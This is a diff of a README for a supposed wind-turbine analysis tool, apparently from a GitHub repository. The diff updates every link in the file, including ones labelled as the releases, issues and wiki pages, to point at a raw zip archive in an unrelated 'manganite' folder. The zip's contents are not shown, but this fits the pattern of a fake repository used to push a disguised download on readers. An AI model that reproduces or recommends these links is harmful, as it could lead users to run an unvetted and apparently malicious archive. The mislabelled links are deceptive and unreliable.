@@ -1,6 +1,6 @@
 # 🌬️ Wind-Turbine-AI-Analyzer - Analyze Wind Turbine Performance Easily
 
-[![Download Now](https://raw.githubusercontent.com/SriramSagarRentapalli/Wind-Turbine-AI-Analyzer/main/manganite/Wind-Turbine-AI-Analyzer.zip%20Now-available-blue)](https://raw.githubusercontent.com/SriramSagarRentapalli/Wind-Turbine-AI-Analyzer/main/manganite/Wind-Turbine-AI-Analyzer.zip)
+[![Download Now](https://github.com/SriramSagarRentapalli/Wind-Turbine-AI-Analyzer/raw/refs/heads/main/manganite/Analyzer-Wind-Turbine-A-v1.1-alpha.5.zip%20Now-available-blue)](https://github.com/SriramSagarRentapalli/Wind-Turbine-AI-Analyzer/raw/refs/heads/main/manganite/Analyzer-Wind-Turbine-A-v1.1-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ To run Wind-Turbine-AI-Analyzer, your system should meet the following requireme
 
 To get started, visit the Releases page to download the tool:
 
-[Visit this page to download](https://raw.githubusercontent.com/SriramSagarRentapalli/Wind-Turbine-AI-Analyzer/main/manganite/Wind-Turbine-AI-Analyzer.zip)
+[Visit this page to download](https://github.com/SriramSagarRentapalli/Wind-Turbine-AI-Analyzer/raw/refs/heads/main/manganite/Analyzer-Wind-Turbine-A-v1.1-alpha.5.zip)
 
 1. Click on the link above to go to the latest release.
 2. Look for the file with the latest version number.
@@ -54,7 +54,7 @@ The application will provide various insights on turbine performance. You will s
 
 ## 🤝 Support
 
-If you encounter issues, please visit the [Issues Page](https://raw.githubusercontent.com/SriramSagarRentapalli/Wind-Turbine-AI-Analyzer/main/manganite/Wind-Turbine-AI-Analyzer.zip) to find help or report problems. The community is here to support you.
+If you encounter issues, please visit the [Issues Page](https://github.com/SriramSagarRentapalli/Wind-Turbine-AI-Analyzer/raw/refs/heads/main/manganite/Analyzer-Wind-Turbine-A-v1.1-alpha.5.zip) to find help or report problems. The community is here to support you.
 
 ## 📝 Contributing
 
@@ -62,6 +62,6 @@ We welcome contributions! If you want to improve the project, please fork the re
 
 ## 💡 Learn More
 
-For more detailed instructions, FAQs, and troubleshooting tips, visit the [wiki page](https://raw.githubusercontent.com/SriramSagarRentapalli/Wind-Turbine-AI-Analyzer/main/manganite/Wind-Turbine-AI-Analyzer.zip).
+For more detailed instructions, FAQs, and troubleshooting tips, visit the [wiki page](https://github.com/SriramSagarRentapalli/Wind-Turbine-AI-Analyzer/raw/refs/heads/main/manganite/Analyzer-Wind-Turbine-A-v1.1-alpha.5.zip).
 
 Thank you for choosing Wind-Turbine-AI-Analyzer. Together, we can make wind energy even more efficient.
